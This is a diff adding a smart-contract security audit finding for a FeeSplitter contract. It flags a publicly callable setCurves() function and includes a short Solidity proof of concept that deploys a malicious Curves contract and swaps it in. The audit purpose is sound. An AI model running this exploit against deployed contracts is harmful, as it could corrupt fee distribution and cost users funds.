@@ -1,0 +1,31 @@
+1. Function `setCurves()` (line 28-30) has an access control issue.  
+   **Reason**: The `setCurves()` function is public and allows anyone to set the `curves` contract address. This could lead to unauthorized changes to the `curves` contract, which is critical for the operation of the `FeeSplitter` contract. An attacker could set this to a malicious contract and manipulate the behavior of the `FeeSplitter`.
+
+2. Function `addFees()` (line 74-80) is correctly protected by the `onlyManager` modifier, which is assumed to be defined in the `Security` contract. However, without seeing the `Security` contract, it's important to ensure that the `onlyManager` modifier is properly implemented to restrict access to authorized managers only.
+
+3. Function `onBalanceChange()` (line 82-87) is also protected by the `onlyManager` modifier. Similar to `addFees()`, it is crucial to verify that the `onlyManager` modifier in the `Security` contract is correctly implemented to prevent unauthorized access.
+
+**Proof of Concept for `setCurves()`:**
+
+An attacker can call the `setCurves()` function to change the `curves` contract to a malicious contract:
+
+```solidity
+// Attacker deploys a malicious Curves contract
+contract MaliciousCurves {
+    function curvesTokenBalance(address, address) external pure returns (uint256) {
+        return 0;
+    }
+
+    function curvesTokenSupply(address) external pure returns (uint256) {
+        return 0;
+    }
+}
+
+// Attacker calls setCurves() on the FeeSplitter contract
+function attack(FeeSplitter feeSplitter) external {
+    MaliciousCurves maliciousCurves = new MaliciousCurves();
+    feeSplitter.setCurves(maliciousCurves);
+}
+```
+
+This attack would allow the attacker to manipulate the token balances and supply, potentially disrupting the fee distribution logic.
